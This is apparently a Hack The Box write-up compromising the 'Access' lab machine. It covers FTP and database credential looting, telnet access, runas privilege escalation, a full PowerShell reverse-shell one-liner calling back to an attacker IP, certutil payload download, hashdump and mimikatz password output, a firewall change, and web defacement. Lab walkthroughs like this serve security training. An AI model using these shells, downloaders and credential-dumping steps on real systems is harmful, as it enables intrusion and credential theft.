+++
title = "HTB/ACCESS"
date = "2019-02-03"
tags = ["htb", "Windows", "mdb", "powershell"]
categories = ["Development"]
menu = "main"
draft = false
+++


# Reconnaissance

1. Box IP: 10.10.10.98, I started with a network scan. Here's what I found:
```bash
    PORT |  STATE | SERVICE | VERSION

    21/tcp | open | ftp    | Microsoft ftpd
    23/tcp | open | telnet |
    80/tcp | open | http   | Microsoft IIS httpd 7.5
``` 

2. On port 80, there was a picture of a server room, **"out.jpg"**, which I saved for later.


![Port 80 Image](/images/htb-Access/1.png)


* I examined **out.jpg** in stegsolve, hoping for a hidden flag. Neither strings nor binwalk revealed anything interesting, so I moved on to the FTP service.


3. I launched FileZilla to connect to **10.10.10.98** as an anonymous user. The root contained two folders: **Backup** (with an `.mbd` file) and **Engineers** (with a password-protected zip file).


![FTP Results](/images/htb-Access/ftp-results.png)


4. Attempting brute-forcing with fcrackzip was slow, so I accessed the **backup.mdb** file using an `.mdb` viewer.


![MDB Table](/images/htb-Access/backup-mdb-table.png)


5. I found usernames and passwords in the **auth-user record** within **backup.mdb**.

* To export all records from the mdb table:
```bash
mdb-tables -d ',' backup.mdb | xargs -L1 -d',' -I{} bash -c 'mdb-export backup.mdb "$1" >"$1".csv' -- {}
```

* Some records were empty. The interesting one was **auth user record**.


![alt text](/images/htb-Access/backup-mdb-export.png)


6. Using one of these credentials, **access4u@security**, I successfully opened the zip file. Attempting the usernames and passwords on FTP for elevated access gave no additional privileges.


![Zip Extraction](/images/htb-Access/engineer-access-control-zip-extracted.png)


7. Inside was **Access Control.pst**, a Microsoft Outlook email file which I imported into Evolution to inspect.

![PST Import](/images/htb-Access/access-control-pst-outlook.png)


8. The email included plaintext credentials for **security: 4Cc3ssC0ntr0ller**. I tried using them on FTP, but that did not work, then I remembered that port 23(Telnet) was open.


![alt text](/images/htb-Access/evolution-access-control-pst.png)


# Scanning 

* With Telnet access

![Telnet Login](/images/htb-Access/security-telnet-login.png)


9. I tried upgrading to a meterpreter shell with **`session -u (Telnet Shell ID)`** but it wouldn't work, so I just used the win command shell.

![alt text](/images/htb-Access/telnet-meterpreter-shell-session-upgrade-u.png)


10. I retrieved **user.txt** from the Desktop. Next stop: root.


![User Hash](/images/htb-Access/security-user-txt.png)


11. In the **Public** directory, I found hints on htb forum to use the **runas** command, useful for privilege escalation.


![Public Directory lnk File](/images/htb-Access/enumerating-public-desktop-lnk.png)

![alt text](/images/htb-Access/runas-ZAccess-lnk.png)


* The “runas” command is used to run commands as other users on windows. With this, we can run commands as an administrator aka Window’s Run as an administrator

12. I realized I can run powershell and I managed to have a reverse shell using runas. At first, PowerShell reverse shell was failing due to restrictions but eventually succeeded after modifying the **Set-ExecutionPolicy**.

```bash
runas /savecred /user:access\Administrator \
"powershell Set-ExecutionPolicy RemoteSigned"
```

# Exploit

13. I setup a listener on port 413 - 10.10.12.109:413 to run in the background (exploit -j) in metasploit

![alt text](/images/htb-Access/meterpreter-listener-powershell.png)

* This is a script for prompting a shell with powershell --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 

* There's also a one-liner command that you can type using
```bash
runas /savedcred /user:access\administrator “powershell oneliner command”
``` 
However that method didn't work for me.

* I ended up using this script - change  **$socket** variable with your listening IP. (https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4) 

14. On the target/victim machine, in the telnet session. I used  **copy con r.ps1** to create an PowerShell file named r.ps1, pasted the script inside, then CTRL-z,  then Enter to save it and exit.

* My session was interrupted in this session, so I opened another telnet session and repeated the same steps again.

15. To run the script  **powershell -command .\r.ps1**  but, that didn't work. I got an error. Basically, saying Powershell scripts cannot run on the machine.

![alt text](/images/htb-Access/cannot-load-exec-powershell-script.png)

16. I found a way to disable the error via cmd 

```bash
 runas.exe  /savecred  /user:Access\Administrator \
"powershell Set-ExecutionPolicy RemoteSigned"
 ```
 
17. That took care of it, re-running the Powershell command ".\r.ps1" worked.


![alt text](/images/htb-Access/meterpreter-half-establised-powershell.png)


18. The powershell script below also works, paste it in a .ps1 file on target.

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.12.109",413);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,
0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).
GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = 
$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes
($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.
Close()
```

19. Unfortunately, I realized that this shell was not a full established shell cause none of the commands like "load" “shell" or “ls” worked in meterpreter. It was an incomplete connection.


![alt text](/images/htb-Access/meterpreter-halfestablished-powershell.png)


20. I looked for another way, I found **CertUtil.exe** was not blocked and it can be used to download a payload and get a reverse shell. I downloaded a payload for a reverse shell which allowed full meterpreter access.


![alt text](/images/htb-Access/paylaod-msfvenom-create.png)

21.  I started a temporary webserver with **simpleHTTPserver** on the directory where notepad.exe (payload I created) was.

![alt text](/images/htb-Access/simpleHttp-python-command.png)

![alt text](/images/htb-Access/simpleHttp-local-webserver.png)


22. I had a listener running on port 23 with my IP as RHOST in the telent session on target, so I executed certutil to download the payload.

![alt text](/images/htb-Access/certutil-runas-exec-notepad.png)

23. It worked! We have the notepad.exe (payload) on the target machine. Then I used runas to run it as an admin. If you tried to run notepad.exe without runas you will get the blocked policy .. cannot do that message..etc. Voila!! Got a fully established meterpreter shell this time.

![alt text](/images/htb-Access/certutil-successful-meterpreter.png)


24. I backgrounded this meterpreter session to use the hashdump module and get hashes of **Admin**. You should run **getsystem** first before **run hashdump**.

![alt text](/images/htb-Access/hashdump-acquired.png)

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:db852e5a46ea5f5514f639a20daa9e2c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
security:1001:aad3b435b51404eeaad3b435b51404ee:b41db16a61cb04b231625de260163015:::
engineer:1002:aad3b435b51404eeaad3b435b51404ee:25c41637f0a9874ac9b90b4a4baf5783:::
```

25. Used John to crack at the hashes. I also loaded mimikatz to get the admin password.

![alt text](/images/htb-Access/mimkikatz-admin-creds.png)


## wdigest credentials

```bash
AuthID     Package    Domain        User                Password
------     -------    ------        ----              | --------
0;996    |  Negotiate |  HTB         |  ACCESS$
0;119773 |  Negotiate |  IIS APPPOOL |  DefaultAppPool|
0;995    |  Negotiate |  NT AUTHORITY|  IUSR
0;997    |  Negotiate |  NT AUTHORITY|  LOCAL SERVICE
0;45589  |  NTLM
0;999    |  NTLM      |  HTB         |  ACCESS$
0;458676 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
0;456008 |  NTLM      |  ACCESS      |  security      |  4Cc3ssC0ntr0ller
0;646488 |  NTLM      |  ACCESS      |  Administrator |  55Acc3ssS3cur1ty@megacorp
```
# Post-Exploit

26. I opened a telnet session and logged in using the admin password. Then I opened port 445/tcp to open a meterpreter shell with **psexec**

```bash
netsh advfirewall firewall add rule dir=in action=allow protocol=TCP \
localport=445 name="allow_TCP-445
```
![alt text](/images/htb-Access/opened-smb-port.png)


27. I also opened port 3389/tcp just for fun and to see if rdesktop would work - it didn't!

====================================================================================

28. I also wanted to test uploading my own jpg file on the webserver instead of the default.jpeg. Looking in websrc

![alt text](/images/htb-Access/webserver-src-pg.png)

```bash
C:\inetpub\wwwroot\out.jpg
```

29. So after uploading a “hack the planet" jpg file on the target machine using the **certutil** trick,  priv. escalate with getsystem, and popping a shell with meterpreter. I copied my htP.jpg into the inetpub folder replacing the existing out.jpg with mine. Oh yeah this is fun!


![alt text](/images/htb-Access/uploading-hack-the-planet.png)

![alt text](/images/htb-Access/target-machine-hack-the-planet.png)

 This was fun, that's it folks until the next box!